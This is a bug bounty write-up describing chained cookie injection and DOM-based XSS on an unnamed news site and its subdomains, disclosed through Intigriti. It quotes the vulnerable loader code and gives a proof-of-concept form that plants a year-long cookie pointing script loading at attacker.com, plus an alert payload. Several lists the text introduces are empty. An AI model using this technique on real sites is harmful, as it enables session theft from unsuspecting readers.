# DOM-Based XSS via Arbitrary Cookie Injection Across a News Site and Its Subdomains

- **Source URL:** https://medium.com/@Assili-yassine/dom-based-xss-via-arbitrary-cookie-injection-across-a-news-site-and-its-subdomains-87ec5e4317c2
- **Fetched:** 2026-11-26
- **Channel:** @dailybountywriteup
- **Telegram message:**  (id 14999)
- **Method:** medium-rss-feed (full content:encoded) readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
- **Author/Published (RSS):** Assiliyassine / Tue, 24 Nov 2026 23:26:30 GMT

👋 Hi, I’m **Yassine Assili**, a web application security researcher and bug bounty hunter from Morocco. I share my findings, research process, and lessons learned along the way.

This is my first security write-up, so I’d really appreciate any feedback!

Before diving into the details, let’s briefly explain the vulnerability class for readers who may be unfamiliar with it.

**Cross-Site Scripting (XSS)** allows attackers to execute malicious JavaScript in a trusted website’s context. **DOM-based XSS** occurs when client-side JavaScript takes attacker-controlled input and passes it to a dangerous sink, such as a dynamically created \<script> element, without proper validation.

**Cookie injection** allows an attacker to make a victim’s browser store a cookie for a target domain. When trusted JavaScript reads that cookie and uses its value without validation, it can turn into a DOM-based XSS vulnerability.

In this write-up, I’ll show how these two weaknesses were chained to achieve persistent, one-click DOM-based XSS across a major news platform and multiple subdomains.

The target’s identity is intentionally withheld because the vulnerability has not yet been fixed.

The program covered the main domain and all subdomains of one of Germany’s largest news publishers.

The attack involved two components:

Individually, neither component appeared particularly dangerous. However, chaining them revealed the issue: the tracking proxy could set a cookie, and the loader trusted its value when loading an external script.

Don’t worry if some of the technical details seem unfamiliar. I’ll explain each step along the way. Let’s get started!

The tracking proxy exposes a setcookie command through a single POST endpoint. I found several weaknesses that allow an attacker to set arbitrary cookies on the target's domain:

Two details matter: Domain=.target.example makes the cookie available across the parent domain and its subdomains, while Max-Age=31536000 keeps it stored for one year.

Bypassing third-party cookie restrictions

A background fetch() request from an attacker's website may not persist the cookie because of browser third-party cookie restrictions.

To bypass this, I used an HTML form with enctype="text/plain" to submit the request through a top-level navigation. The browser navigates directly to the tracking proxy, allowing its response to set the cookie in a first-party context.

The victim is then redirected to the target website, where the malicious cookie is read by the JavaScript loader.

Initially, I didn’t see a significant impact in the first vulnerability, so I documented it in my notes and moved on. A few days later, while hunting on the same program, I discovered something interesting in the site’s JavaScript loader.

The loader script (loader.js) runs on article pages. It reads a cookie named loaderenv and, if present, uses its value as the hostname of an external script. No validation is performed:

```
if ((readCookie("loaderenv") !== '') && !window.isLoaderInDarklaunch) {
    const loaderEnvironment = readCookie("loaderenv");
    const script = document.createElement("script");
    script.setAttribute("type", "text/javascript");
    script.setAttribute("src", "https://" + loaderEnvironment + "/loader-main.js");
    document.head.appendChild(script);
    window.isLoaderInDarklaunch = true;
    return;
}
```
This appears to be an environment-override feature, possibly intended for developers to load scripts from a staging environment.

However, the cookie value is directly concatenated into the script’s src attribute:

src = "https://" + loaderEnvironment + "/loader-main.js"

Since the cookie is attacker-controlled through **Vulnerability #1**, setting it to attacker.com makes the browser load:

\<script src="https://attacker.com/loader-main.js">\</script>

The browser executes the external script in the context of the target page. This gives the attacker’s JavaScript access to the page’s DOM, non-HttpOnly cookies, and same-origin functionality available to the victim.

This is **DOM-based XSS**: the vulnerable JavaScript reads attacker-controlled data from a cookie and uses it to load an external script without validation. The root cause is treating a cookie as trusted configuration.

Individually, both vulnerabilities might appear low impact:

Chained together, they create a persistent DOM-based XSS.

The attack takes three steps:

Vulnerability #1 provides the cookie injection, while Vulnerability #2 turns that cookie into JavaScript execution.

Although the malicious state is stored in the victim’s browser rather than on the server, the result behaves similarly to stored XSS.

The PoC uses two files hosted on an attacker-controlled server.

**1. Payload script**

The attacker.com/loader-main.js file contains a harmless payload:

```
(function () {
    window.alert(document.cookie);
    console.log(document.cookie);
})();
```
This demonstrates that arbitrary JavaScript executes in the target’s origin.

**2. PoC page**

The HTML page submits the cookie-injection request using a form with enctype="text/plain":

\<form action="https://tracking.target.example/" method="POST" enctype="text/plain" target="inject">

\<input name='{"client":{"clientTimestamp":1,"domain":".target.example"},"cmd":{"key":"setcookie","data":\[{"name":"loaderenv","value":"attacker.com","exdays":31536000}\]},"data":\[\],"requestType":"XMLHttpRequest","x":"' value='="}'>

\</form>

After the cookie is set, the victim is redirected to an article page on the target website.

**3. Attack execution**

The complete attack flow is:

**Persistence:** The cookie remains valid for one year, allowing the XSS to trigger on subsequent visits to affected pages.

I also found the same cookie-controlled script-loading mechanism in the JavaScript code of another subdomain.

This means the issue was not limited to the main domain. The same vulnerability pattern could affect other subdomains using this loader.

Finally, I reported this bug through the Intigriti bug bounty program. It was accepted after just three days.

Sometimes, the real vulnerability is not in a single component, but in how multiple components interact.

Thanks for reading! See you in the next write-up! 👋

**Connect with me on LinkedIn:** [https://www.linkedin.com/in/yassine-assili/](https://www.linkedin.com/in/yassine-assili/)
